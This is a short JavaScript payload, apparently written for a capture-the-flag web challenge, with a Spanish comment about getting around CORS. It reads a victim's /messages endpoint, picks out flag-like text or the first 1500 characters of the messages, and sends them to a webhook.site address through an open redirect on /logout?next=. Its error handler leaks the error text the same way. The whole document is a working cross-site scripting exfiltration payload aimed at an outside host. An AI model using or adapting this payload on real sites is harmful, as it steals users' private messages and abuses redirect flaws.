(async()=>{try{
  const j=await (await fetch('/messages')).json();
  const msgs=(j.messages||[]).map(m=>m.message);
  const hit=msgs.find(t=>/FLAG|CTF|{|}/i.test(t))||msgs.join('\n').slice(0,1500);
  // Exfiltra como PATH para no pelearte con CORS
  location.href=`/logout?next=https://webhook.site/9d777251-6207-4401-8b1e-a1fabe8c794e/${encodeURIComponent(hit)}`
  location.href="/logout?next=https://webhook.site/TU-UUID/ping";
}catch(e){
  location.href=`/logout?next=https://webhook.site/9d777251-6207-4401-8b1e-a1fabe8c794e/err_${encodeURIComponent(e.message)}`
  location.href="/logout?next=https://webhook.site/TU-UUID/ping";
}})();
